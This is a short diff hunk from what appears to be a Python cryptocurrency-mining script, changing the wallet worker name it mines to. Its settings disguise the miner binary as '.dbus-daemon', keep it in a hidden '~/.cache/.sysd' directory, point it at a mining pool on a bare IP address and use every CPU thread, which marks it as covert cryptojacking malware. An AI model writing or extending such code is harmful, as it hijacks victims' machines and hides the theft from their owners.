@@ -16,7 +16,7 @@ BIN_NAME = "cpuminer-sse2"
 ALIAS_BIN = ".dbus-daemon"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
 POOL = "stratum+tcp://134.199.163.180:6343"
-WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
+WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Acut"
 PASSWORD = "x"
 THREADS = os.cpu_count()
 
